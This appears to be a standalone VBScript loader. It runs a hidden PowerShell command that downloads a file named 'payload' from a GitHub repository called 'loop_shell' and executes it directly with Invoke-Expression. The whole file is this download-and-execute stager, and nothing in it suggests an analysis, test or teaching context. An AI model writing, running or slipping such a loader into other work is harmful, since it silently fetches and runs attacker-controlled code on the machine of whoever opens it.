Set objShell = CreateObject("WScript.Shell")

' Define the PowerShell command
powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/payload -UseBasicParsing | iex
"""

' Run the PowerShell command
objShell.Run powershellCommand, 0, True

' Cleanup
Set objShell = Nothing
